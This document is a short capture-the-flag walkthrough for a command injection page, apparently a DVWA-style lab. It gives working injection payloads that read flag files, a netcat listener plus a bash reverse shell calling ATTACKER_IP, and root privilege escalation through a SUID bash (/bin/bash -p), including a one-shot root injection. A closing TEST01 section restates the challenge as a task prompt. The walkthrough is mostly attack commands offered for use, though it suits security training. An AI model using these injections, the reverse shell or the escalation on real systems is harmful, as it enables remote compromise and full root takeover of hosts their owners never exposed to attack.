# PWN instructions
## This is a short walkthrough to get both flags using command injection page

# EASY01 >
First, using user:user as credentials
Then browse to /vulnerabilities/exec/

Exploit the input by entering the following:
```
ip=127.0.0.1; cat /var/www/user.txt
```

The response should includes the user flag:

```
flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

To get foothold follow next steps

Start a listener before anything like the following :
```
nc -lvnp 4444
```

Enter in the same input the following:
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Now you should have access and can pivot.
Next step is to get root flag.

As `www-data`, the root flag is unreadable:
```sh
$ cat /root/root.txt
cat: /root/root.txt: Permission denied
```

First enumerate SUID binaries — the standard first check:

```sh
find / -perm -4000 -type f 2>/dev/null
```

With your user access enter the following:
```sh
/bin/bash -p
id            # euid=0(root)
cat /root/root.txt
```

Now you should also have the root flag

```
flag{yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy}
```

Alternatively you can get it one shot from the web input without the listener using:
```
ip=127.0.0.1; /bin/bash -pc 'cat /root/root.txt'
```
# TEST01 >
First, using user:user as credentials you log into the site then browse to /vulnerabilities/exec/

Exploit the input and to display user flag situated at "/var/www/user.txt".

Find your way to have privilege escalation and gain root.

Recon priv methods and find a way to display root flag situated at "/root/root.txt".

I seek only those two flags.
